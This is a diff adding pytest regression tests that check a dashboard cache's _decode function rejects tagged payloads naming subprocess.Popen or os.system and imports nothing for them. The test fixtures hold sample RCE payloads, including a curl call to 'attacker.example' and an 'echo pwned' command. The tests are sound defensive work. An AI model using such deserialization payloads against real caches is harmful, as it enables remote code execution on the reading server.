@@ -609,6 +609,59 @@ def test_redis_path_treats_malformed_cached_bytes_as_cache_miss(
     assert any("malformed" in record.message.lower() for record in caplog.records)
 
 
+def test_decode_rejects_disallowed_dataclass_tag_instead_of_importing_it(mocker):
+    """Regression test for the security review finding on issue #32's fix:
+    `_decode` must resolve `__dataclass__` tags exclusively through an
+    explicit allowlist of this cache's own dataclasses, never via
+    `importlib`/`getattr` on an attacker-controlled dotted path. Otherwise a
+    Redis value like `{"__dataclass__": "subprocess.Popen", "fields": {...}}`
+    - written by anyone with access to the configured Redis key space - would
+    get `subprocess.Popen(**fields)` executed on the next cache read, an RCE
+    gadget equivalent in impact to the pickle RCE this module replaced.
+    """
+    import_spy = mocker.spy(__import__("importlib"), "import_module")
+
+    malicious_payload = {
+        "__dataclass__": "subprocess.Popen",
+        "fields": {"args": ["curl", "attacker.example/x"]},
+    }
+
+    with pytest.raises(ValueError, match="disallowed"):
+        dashboard_cache._decode(malicious_payload)
+
+    # Must never have attempted to import the attacker-named module at all.
+    assert all(
+        call.args[0] != "subprocess" for call in import_spy.call_args_list
+    )
+
+
+def test_decode_rejects_disallowed_dataclass_tag_via_os_system(mocker):
+    """Same guarantee as above for a second disallowed target, confirming
+    this isn't specific to one module name."""
+    import_spy = mocker.spy(__import__("importlib"), "import_module")
+
+    malicious_payload = {
+        "__dataclass__": "os.system",
+        "fields": {"command": "echo pwned"},
+    }
+
+    with pytest.raises(ValueError, match="disallowed"):
+        dashboard_cache._decode(malicious_payload)
+
+    assert all(call.args[0] != "os" for call in import_spy.call_args_list)
+
+
+def test_decode_still_accepts_the_allowlisted_dataclasses():
+    """Sanity check that the allowlist fix didn't break legitimate decoding
+    of the dataclasses this cache actually stores."""
+    original = dashboard.CategoryBreakdown(category="Groceries", amount=42.5, percentage=25.0)
+    encoded = dashboard_cache._encode(original)
+
+    decoded = dashboard_cache._decode(encoded)
+
+    assert decoded == original
+
+
 def test_falls_back_to_local_cache_when_redis_not_configured(fake_supabase, fake_settings, mocker):
     """Without REDIS_URL/a configured client, `get_redis_client()` returns
     None and the dashboard cache must still work via its in-process
